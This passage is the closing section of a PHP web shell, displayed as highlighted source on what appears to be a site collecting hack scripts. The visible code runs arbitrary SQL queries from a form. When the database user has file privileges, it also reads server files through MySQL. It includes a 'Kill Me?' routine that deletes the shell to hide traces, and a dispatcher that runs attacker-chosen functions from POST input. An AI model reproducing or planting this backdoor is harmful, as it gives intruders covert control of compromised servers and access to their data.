<span class="lineno">1914</span>                        <span class="k">while</span><span class="p">(</span><span class="nv">$item</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>    <span class="p">{</span>
<span class="lineno">1915</span>                            <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$title</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1916</span>                                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1917</span>                                <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span>
<span class="lineno">1918</span>                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;th&amp;gt;&#39;</span><span class="o">.</span><span class="nv">$key</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/th&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1919</span>                                <span class="nb">reset</span><span class="p">(</span><span class="nv">$item</span><span class="p">);</span>
<span class="lineno">1920</span>                                <span class="nv">$title</span><span class="o">=</span><span class="k">true</span><span class="p">;</span>
<span class="lineno">1921</span>                                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1922</span>                                <span class="nv">$line</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
<span class="lineno">1923</span>                            <span class="p">}</span>
<span class="lineno">1924</span>                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;tr class=&quot;l&#39;</span><span class="o">.</span><span class="nv">$line</span><span class="o">.</span><span class="s1">&#39;&quot;&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1925</span>                            <span class="nv">$line</span> <span class="o">=</span> <span class="nv">$line</span><span class="o">==</span><span class="mi">1</span><span class="o">?</span><span class="mi">2</span><span class="o">:</span><span class="mi">1</span><span class="p">;</span>
<span class="lineno">1926</span>                            <span class="k">foreach</span><span class="p">(</span><span class="nv">$item</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1927</span>                                <span class="k">if</span><span class="p">(</span><span class="nv">$value</span> <span class="o">==</span> <span class="k">null</span><span class="p">)</span>
<span class="lineno">1928</span>                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&amp;lt;i&amp;gt;null&amp;lt;/i&amp;gt;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1929</span>                                <span class="k">else</span>
<span class="lineno">1930</span>                                    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;td&amp;gt;&#39;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$value</span><span class="p">))</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/td&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1931</span>                            <span class="p">}</span>
<span class="lineno">1932</span>                            <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/tr&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1933</span>                        <span class="p">}</span>
<span class="lineno">1934</span>                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/table&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1935</span>                    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1936</span>                        <span class="k">echo</span> <span class="s1">&#39;&amp;lt;div&amp;gt;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">error</span><span class="p">())</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1937</span>                    <span class="p">}</span>
<span class="lineno">1938</span>                <span class="p">}</span>
<span class="lineno">1939</span>                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;br&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form onsubmit=&#39;d.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">query</span><span class="se">\&quot;</span><span class="s2">;d.sf.p2.value=this.query.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;textarea name=&#39;query&#39; style=&#39;width:100%;height:100px&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1940</span>                 <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">))</span>
<span class="lineno">1941</span>                     <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1942</span>                 <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;input type=submit value=&#39;Execute&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1943</span>                <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1944</span>            <span class="p">}</span>
<span class="lineno">1945</span>            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br/&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1946</span>             <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span><span class="o">==</span><span class="s1">&#39;mysql&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1947</span>                 <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">query</span><span class="p">(</span><span class="s2">&quot;SELECT 1 FROM mysql.user WHERE concat(`user`, &#39;@&#39;, `host`) = USER() AND `File_priv` = &#39;y&#39;&quot;</span><span class="p">);</span>
<span class="lineno">1948</span>                 <span class="k">if</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">fetch</span><span class="p">())</span>
<span class="lineno">1949</span>                     <span class="k">echo</span> <span class="s2">&quot;&amp;lt;form onsubmit=&#39;d.sf.p1.value=</span><span class="se">\&quot;</span><span class="s2">loadfile</span><span class="se">\&quot;</span><span class="s2">;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;span&amp;gt;Load file&amp;lt;/span&amp;gt; &amp;lt;input  class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1950</span>             <span class="p">}</span>
<span class="lineno">1951</span>            <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;loadfile&#39;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1952</span>                <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">loadFile</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p2&#39;</span><span class="p">]);</span>
<span class="lineno">1953</span>                <span class="k">echo</span> <span class="s1">&#39;&amp;lt;pre class=ml1&amp;gt;&#39;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;&amp;lt;/pre&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1954</span>            <span class="p">}</span>
<span class="lineno">1955</span>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1956</span>         <span class="k">echo</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nx">error</span><span class="p">());</span>
<span class="lineno">1957</span>     <span class="p">}</span>
<span class="lineno">1958</span>    <span class="k">echo</span> <span class="s1">&#39;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">1959</span>     <span class="nx">madfooter</span><span class="p">();</span>
<span class="lineno">1960</span>     
<span class="lineno">1961</span>  <span class="p">}</span>
<span class="lineno">1962</span>  
<span class="lineno">1963</span>  <span class="k">function</span> <span class="nf">madselfrm</span><span class="p">()</span>
<span class="lineno">1964</span>  <span class="p">{</span>
<span class="lineno">1965</span>     
<span class="lineno">1966</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span>
<span class="lineno">1967</span>        <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="nb">preg_replace</span><span class="p">(</span><span class="s1">&#39;!\(\d+\)\s.*!&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="k">__FILE__</span><span class="p">)))</span>
<span class="lineno">1968</span>            <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Shell has been removed&#39;</span><span class="p">);</span>
<span class="lineno">1969</span>        <span class="k">else</span>
<span class="lineno">1970</span>            <span class="k">echo</span> <span class="s1">&#39;unlink error!&#39;</span><span class="p">;</span>
<span class="lineno">1971</span>     <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;p1&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;yes&#39;</span><span class="p">)</span>
<span class="lineno">1972</span>         <span class="nx">madhead</span><span class="p">();</span>
<span class="lineno">1973</span>    <span class="k">echo</span> <span class="s2">&quot;&amp;lt;div class=header&amp;gt;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&quot;</span><span class="p">;</span>
<span class="lineno">1974</span>     
<span class="lineno">1975</span>     
<span class="lineno">1976</span>     <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno">1977</span> <span class="s2">    </span>
<span class="lineno">1978</span> <span class="s2">                /^\</span>
<span class="lineno">1979</span> <span class="s2">       _.-`:   /   \   :&#39;-._</span>
<span class="lineno">1980</span> <span class="s2">     ,`    :  |     |  :    &#39;.</span>
<span class="lineno">1981</span> <span class="s2">   ,`       \,|     |,/       &#39;.</span>
<span class="lineno">1982</span> <span class="s2">  /           `-...-`           \</span>
<span class="lineno">1983</span> <span class="s2"> :              .&#39;.              :</span>
<span class="lineno">1984</span> <span class="s2"> |             . &#39; .             |</span>
<span class="lineno">1985</span> <span class="s2"> |             &#39; . &#39;             |</span>
<span class="lineno">1986</span> <span class="s2"> :              &#39;.&#39;              :</span>
<span class="lineno">1987</span> <span class="s2">  \           ,-&#39;&#39;&#39;-,           /</span>
<span class="lineno">1988</span> <span class="s2">   `.       /&#39;|     |&#39;\       ,&#39;</span>
<span class="lineno">1989</span> <span class="s2">     `._   ;  |     |  ;   _,&#39;</span>
<span class="lineno">1990</span> <span class="s2">        `-.:  |     |  :,-&#39;</span>
<span class="lineno">1991</span> <span class="s2">              |     |</span>
<span class="lineno">1992</span> <span class="s2">              |     |</span>
<span class="lineno">1993</span> <span class="s2">              |     |</span>
<span class="lineno">1994</span> <span class="s2">              |     |</span>
<span class="lineno">1995</span> <span class="s2">              |     |</span>
<span class="lineno">1996</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1997</span>     
<span class="lineno">1998</span>     
<span class="lineno">1999</span>     
<span class="lineno">2000</span>     <span class="k">echo</span> <span class="s1">&#39;&amp;lt;br&amp;gt;Kill Me?&amp;lt;br&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&amp;gt;Yes&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&#39;</span><span class="p">;</span>
<span class="lineno">2001</span>    <span class="nx">madFooter</span><span class="p">();</span>
<span class="lineno">2002</span>     
<span class="lineno">2003</span>  <span class="p">}</span>
<span class="lineno">2004</span> 
<span class="lineno">2005</span> 
<span class="lineno">2006</span> <span class="k">if</span><span class="p">(</span> <span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span>
<span class="lineno">2007</span>    <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$default_action</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mad&#39;</span> <span class="o">.</span> <span class="nv">$default_action</span><span class="p">))</span>
<span class="lineno">2008</span>        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$default_action</span><span class="p">;</span>
<span class="lineno">2009</span>    <span class="k">else</span>
<span class="lineno">2010</span>        <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;FilesMan&#39;</span><span class="p">;</span>
<span class="lineno">2011</span> <span class="k">if</span><span class="p">(</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">function_exists</span><span class="p">(</span><span class="s1">&#39;mad&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">])</span> <span class="p">)</span>
<span class="lineno">2012</span>    <span class="nb">call_user_func</span><span class="p">(</span><span class="s1">&#39;mad&#39;</span> <span class="o">.</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span>
<span class="lineno">2013</span>    <span class="k">exit</span><span class="p">;</span>
<span class="lineno">2014</span> <span class="cp">?&gt;</span><span class="x"></span></code></pre></div>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
